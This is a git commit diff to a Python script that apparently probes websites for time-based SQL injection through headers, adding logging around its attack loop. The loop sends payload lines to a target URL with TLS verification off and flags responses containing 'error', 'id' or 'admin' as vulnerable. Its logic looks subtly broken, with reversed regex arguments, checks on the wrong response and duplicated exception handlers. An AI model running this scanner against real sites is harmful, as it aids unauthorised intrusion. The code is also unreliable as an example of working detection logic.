5ddcceff9026299273ebe8a68b97a69ca8f3c4dc
alimirmohammad <ali@13>
2023-10-29 18:34:00 -0400

    logs #8

--- lib/scripts/Time_based_Header_inj.py
+++ lib/scripts/Time_based_Header_inj.py
@@ -6,6 +6,7 @@ from colorama import Fore,init
 from datetime import datetime
 # from database import create_database_for_Captures
 import sqlite3
+import logging
 
 
 ####################################################
@@ -27,7 +28,7 @@ headers = {
               for The payloads"""
 
 
-
+logging.basicConfig(filename="SQLJ.log",level=logging.DEBUG)
 
 
 
@@ -51,6 +52,7 @@ async def Time_based_sql_injection_HEADER(urls):
             req = requests.get(url=urls,verify=False)
             if req.status_code == 200:
                 ask = input(f"[{datetime.now()}]"+Fore.GREEN + f"Looks like the host is up with the url:{urls} \n Do you want to send the payload to the website? ")
+                logging.info(f"The host target:{urls} is up with status code 200.attack:{attack_type},time:{datetime.now()}")
 
                 if ask.lower() == "y":
                     for line in sorted_payload.split("\n"):
@@ -63,45 +65,55 @@ async def Time_based_sql_injection_HEADER(urls):
                         # print(line)
                         ack = requests.post(url=urls, data=params,verify=False)
                         print(f"[{datetime.now()}]","|Current payload: |", line,"|with status code|:",ack.status_code,"|Attack:|",attack_type,"\n|Headers:|",headers)
+                        logging.info(f"Sending the payload:{line} to the target:{urls},attack:{attack_type},time:{datetime.now()}")
                         print(f"[{datetime.now()}]",Fore.GREEN + str(ack.status_code))
                         await asyncio.sleep(5)
                         if "error" in ack.text:
                             print(f"[{datetime.now()}]",Fore.RED + "|Vulnerability found|:", ack.text,"\n|Headers:|",headers)
+                            await asyncio.sleep(3)
+                            logging.info(f"the error message returned as a response,This might be injectable,attack:{attack_type},target:{urls},time:{datetime.now()}")
                             
                         vuln = re.findall(ack.text,pattern,flags=re.IGNORECASE)
                         htmlVULN = re.findall(ack.text,htmlpattern,flags=re.IGNORECASE)
                         if vuln:
                             print(f"[{datetime.now()}]",Fore.RED + " | Vulnerability found: |", ack.text," | with the count of: |",len(vuln),"|Attack:|",attack_type,"\n|Headers:|",headers)
+                            logging.info(f"Error parameter founded in the response,this might be injectable,attack:{attack_type},time:{datetime.now()},target:{urls}")
                             await asyncio.sleep(3)
                         
                         if htmlVULN:
                             print(f"[{datetime.now()}]",Fore.RED + "|Vulnerability found|:", ack.text,"with the count of:",len(htmlVULN),"|Attack:|",attack_type,"\n|Headers:|",headers)
+                            logging.info(f"id parameter founded in the response,this might be injectable,attack:{attack_type},time:{datetime.now()},target:{urls}")
                             await asyncio.sleep(3)
                         
                         word = "id" in req.text
                         errword = "error" in req.text
                         if word:
                             print(f"[{datetime.now()}]",Fore.GREEN + "|Vulnerability found|:", ack.text,"with the count of:",htmlVULN,"|Attack:|",attack_type,"\n|Headers:|",headers)
+                            logging.info(f"id parameter founded in the response,this might be injectable,attack:{attack_type},time:{datetime.now()},target:{urls}")
                             await asyncio.sleep(3)
                         
                         if errword:
                             print(f"[{datetime.now()}]",Fore.RED + "|Vulnerability found: in the response code of:|", ack.text,"with the count of:",len(htmlVULN),"|Attack:|",attack_type,"\n|Headers:|",headers)
+                            logging.info(f"Error parameter founded in the response,this might be injectable,attack:{attack_type},time:{datetime.now()},target:{urls}")
                             await asyncio.sleep(3)
                             
                         
                             
                     if req.status_code == 302:
                         print(f"[{datetime.now()}]","|Could find injectable area on the website,keyword:|",line,"\n|Headers:|",headers)
+                        logging.info(f"Could find injectable area on the website,keyword:{line},attack:{attack_type},time:{datetime.now()},target:{urls}")
                         done = True
                         
                     if "Admin" in vuln or "admin" in vuln or "Admin" in ack.text or "admin" in ack.text or "Admin" in htmlVULN or "admin" in htmlVULN:
                         print(f"[{datetime.now()}]",Fore.GREEN+"[INFO]Could connect to the website but did found injectable area on the website.","|Attack:|",attack_type,"\n|Headers:|",headers)
+                        logging.info(f"Could connect to the website but did found injectable area on the website,attack:{attack_type},time:{datetime.now()},target:{urls}")
                         
                 else:
                     pass
                 
             else:
                 print(f"[{datetime.now()}]",Fore.RED+"[INFO] Host seems to be down.","|Attack:|",attack_type,"\n|Headers:|",headers)
+                logging.error(f"Host:{urls} seems to b down,attack:{attack_type},time:{datetime.now()}")
                 
         # time_based_injection_capture.append(str(htmlVULN))
         # time_based_injection_capture.append(str(vuln))
@@ -120,18 +132,23 @@ async def Time_based_sql_injection_HEADER(urls):
                     
     except Exception as e:
         print(f"[{datetime.now()}]",e)
+        logging.error(f"An error occurred:{e},attack:{attack_type},time:{datetime.now()}")
     
     except ConnectionAbortedError as e:
         print(f"[{datetime.now()}]","[ERROR]ConnectionAbortedError:",e,"|Attack:|",attack_type,"\n|Headers:|",headers)
+        logging.error(f"connection aborted,attack:{attack_type},time:{datetime.now()}")
         
     except ConnectionError as e:
         print(f"[{datetime.now()}]","[ERROR]ConnectionError:",e,"|Attack:|",attack_type,"\n|Headers:|",headers)
+        logging.error(f"connection error,attack:{attack_type},time:{datetime.now()}")
         
     except ConnectionRefusedError as e:
         print(f"[{datetime.now()}]","[ERROR]ConnectionRefusedError",e,"|Attack:|",attack_type,"\n|Headers:|",headers)
+        logging.error(f"connection refused,attack:{attack_type},time:{datetime.now()}")
         
     except  ConnectionResetError as e:
         print(f"[{datetime.now()}]","[ERROR]ConnectionResetError:",e,"|Attack:|",attack_type,"\n|Headers:|",headers)
+        logging.error(f"connection reset,attack:{attack_type},time:{datetime.now()}")
         
     except KeyboardInterrupt as e:
         # print(f"[{datetime.now()}]","[ERROR]KeyboardInterrupt:",e)
@@ -142,6 +159,7 @@ async def Time_based_sql_injection_HEADER(urls):
     
     except Exception as e:
         print(f"[{datetime.now()}]",f"Error: {str(e)}","|Attack:|",attack_type)
+        logging.error(f"Error:{str(e)},attack:{attack_type},time:{datetime.now()}")
         
     except MemoryError:
         import psutil
@@ -161,14 +179,7 @@ async def Time_based_sql_injection_HEADER(urls):
 # asyncio.run(Memory_handling())
     
     finally:
-        try:
-            global time_based_injection_capture
-            print(f"[{datetime.now()}]",Fore.BLUE+f"""[INFO] The final result of html response:
-                        \n{ack.text}\n     """)
-            time_based_injection_capture.append(ack.text)
-            
-        except:
-            pass
+        pass
 
         
 # asyncio.run(Error_based_inj())
